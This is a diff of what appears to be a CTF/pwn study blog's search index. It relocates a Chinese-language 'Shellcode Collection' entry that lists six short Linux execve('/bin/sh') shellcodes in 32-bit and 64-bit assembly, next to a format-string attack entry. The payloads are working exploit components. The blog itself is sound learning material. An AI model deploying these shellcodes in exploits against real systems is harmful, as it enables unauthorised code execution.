@@ -89,6 +89,33 @@ large-bin:
       </tags>
   </entry>
   <entry>
+    <title>Shellcode Collection</title>
+    <url>/2022/03/21/shellcode/</url>
+    <content><![CDATA[<h2 id="32位"><a class="markdownIt-Anchor" href="#32位"></a> 32位</h2>
+<p>有&quot;\x00&quot;最短 20 byte</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shellcode= &#x27;&#x27;&#x27;            </span><br><span class="line">xor ecx,ecx               </span><br><span class="line">mul ecx                   </span><br><span class="line">mov al,0xb                </span><br><span class="line">push 0x68732f             </span><br><span class="line">push 0x6e69622f           </span><br><span class="line">mov ebx,esp               </span><br><span class="line">int 0x80                  </span><br><span class="line">&#x27;&#x27;&#x27;                       </span><br><span class="line">shellcode=asm(shellcode)</span><br></pre></td></tr></table></figure>
+<p>无&quot;\x00&quot;最短 21 byte</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor ecx,ecx</span><br><span class="line">mul ecx</span><br><span class="line">push eax</span><br><span class="line">mov al,0xb</span><br><span class="line">push 0x68732f2f   </span><br><span class="line">push 0x6e69622f   </span><br><span class="line">mov ebx,esp</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
+<p>标准shellcode 23 byte</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br><span class="line">push edx</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">mov ebx,esp</span><br><span class="line">xor eax,eax</span><br><span class="line">mov al,0xB</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
+<h2 id="64位"><a class="markdownIt-Anchor" href="#64位"></a> 64位</h2>
+<p>最短有&quot;\x00&quot; 22 byte</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rsi,rsi</span><br><span class="line">mul esi</span><br><span class="line">mov rbx,0x68732f6e69622f</span><br><span class="line">push rbx</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">mov al, 59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+<p>最短无&quot;\x00&quot; 23 byte</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rsi,rsi</span><br><span class="line">mul esi</span><br><span class="line">push rax</span><br><span class="line">mov rbx,0x68732f2f6e69622f</span><br><span class="line">push rbx</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">mov al, 59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+<p>标准shellcode 31 byte</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor    rdi,rdi</span><br><span class="line">xor    rsi,rsi</span><br><span class="line">xor    rdx,rdx</span><br><span class="line">xor    rax,rax</span><br><span class="line">push   rax</span><br><span class="line">mov rbx,0x68732f2f6e69622f</span><br><span class="line">push   rbx</span><br><span class="line">mov    rdi,rsp</span><br><span class="line">mov    al,0x3b</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
+<h3 id="转载自"><a class="markdownIt-Anchor" href="#转载自"></a> 转载自:</h3>
+<p><a href="https://b0ldfrev.gitbook.io/note/pwn/linux_shellcode">Linux_ShellCode</a></p>
+]]></content>
+      <categories>
+        <category>shellcode</category>
+      </categories>
+      <tags>
+        <tag>shellcode</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Format-String Attack</title>
     <url>/2022/03/18/fmtstr_attack/</url>
     <content><![CDATA[<h2 id="1-漏洞样式"><a class="markdownIt-Anchor" href="#1-漏洞样式"></a> 1. 漏洞样式</h2>
@@ -154,33 +181,6 @@ payload1实现写4(p32为4byte)到target_address</p>
       </categories>
       <tags>
         <tag>Format String</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Shellcode Collection</title>
-    <url>/2022/03/21/shellcode/</url>
-    <content><![CDATA[<h2 id="32位"><a class="markdownIt-Anchor" href="#32位"></a> 32位</h2>
-<p>有&quot;\x00&quot;最短 20 byte</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">shellcode= &#x27;&#x27;&#x27;            </span><br><span class="line">xor ecx,ecx               </span><br><span class="line">mul ecx                   </span><br><span class="line">mov al,0xb                </span><br><span class="line">push 0x68732f             </span><br><span class="line">push 0x6e69622f           </span><br><span class="line">mov ebx,esp               </span><br><span class="line">int 0x80                  </span><br><span class="line">&#x27;&#x27;&#x27;                       </span><br><span class="line">shellcode=asm(shellcode)</span><br></pre></td></tr></table></figure>
-<p>无&quot;\x00&quot;最短 21 byte</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor ecx,ecx</span><br><span class="line">mul ecx</span><br><span class="line">push eax</span><br><span class="line">mov al,0xb</span><br><span class="line">push 0x68732f2f   </span><br><span class="line">push 0x6e69622f   </span><br><span class="line">mov ebx,esp</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
-<p>标准shellcode 23 byte</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor ecx,ecx</span><br><span class="line">xor edx,edx</span><br><span class="line">push edx</span><br><span class="line">push 0x68732f2f</span><br><span class="line">push 0x6e69622f</span><br><span class="line">mov ebx,esp</span><br><span class="line">xor eax,eax</span><br><span class="line">mov al,0xB</span><br><span class="line">int 0x80</span><br></pre></td></tr></table></figure>
-<h2 id="64位"><a class="markdownIt-Anchor" href="#64位"></a> 64位</h2>
-<p>最短有&quot;\x00&quot; 22 byte</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rsi,rsi</span><br><span class="line">mul esi</span><br><span class="line">mov rbx,0x68732f6e69622f</span><br><span class="line">push rbx</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">mov al, 59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
-<p>最短无&quot;\x00&quot; 23 byte</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor rsi,rsi</span><br><span class="line">mul esi</span><br><span class="line">push rax</span><br><span class="line">mov rbx,0x68732f2f6e69622f</span><br><span class="line">push rbx</span><br><span class="line">push rsp</span><br><span class="line">pop rdi</span><br><span class="line">mov al, 59</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
-<p>标准shellcode 31 byte</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">xor    rdi,rdi</span><br><span class="line">xor    rsi,rsi</span><br><span class="line">xor    rdx,rdx</span><br><span class="line">xor    rax,rax</span><br><span class="line">push   rax</span><br><span class="line">mov rbx,0x68732f2f6e69622f</span><br><span class="line">push   rbx</span><br><span class="line">mov    rdi,rsp</span><br><span class="line">mov    al,0x3b</span><br><span class="line">syscall</span><br></pre></td></tr></table></figure>
-<h3 id="转载自"><a class="markdownIt-Anchor" href="#转载自"></a> 转载自:</h3>
-<p><a href="https://b0ldfrev.gitbook.io/note/pwn/linux_shellcode">Linux_ShellCode</a></p>
-]]></content>
-      <categories>
-        <category>shellcode</category>
-      </categories>
-      <tags>
-        <tag>shellcode</tag>
       </tags>
   </entry>
 </search>
